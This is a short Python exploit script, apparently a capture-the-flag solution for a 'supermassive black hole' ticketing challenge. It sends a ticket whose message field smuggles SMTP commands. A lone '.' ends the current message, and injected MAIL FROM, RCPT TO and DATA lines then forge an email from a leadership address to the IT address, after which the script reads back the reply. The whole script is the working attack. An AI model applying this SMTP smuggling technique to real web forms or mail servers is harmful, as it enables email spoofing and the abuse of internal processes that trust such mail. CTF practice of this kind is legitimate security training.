import os
import textwrap

import requests

BASE_URL = "https://inst-29093f4559a83954-supermassive-black-hole.chal.uiuc.tf/"
TICKET_ID = "A"
SUBMIT_TICKET_URL = os.path.join(BASE_URL, "submit_ticket")
CHECK_RESPONSE_URL = os.path.join(BASE_URL, "check_response", TICKET_ID)


def main():
    data = {
        "subject": "A",
        "message": textwrap.dedent(f"""\
            A\n\
            .\r\n\
            MAIL FROM:<leadership@blackholeticketing.com>\r\n\
            RCPT TO:<it@blackholeticketing.com>\r\n\
            DATA\r\n\
            From: leadership@blackholeticketing.com\r\n\
            To: it@blackholeticketing.com\r\n\
            Subject: A\r\n\
            X-Ticket-ID: {TICKET_ID}\r\n\
            \r\n\
            A\
        """)
    }

    requests.post(SUBMIT_TICKET_URL, data=data)
    response = requests.get(CHECK_RESPONSE_URL)
    print(response.json().get("response"))


if __name__ == "__main__":
    main()
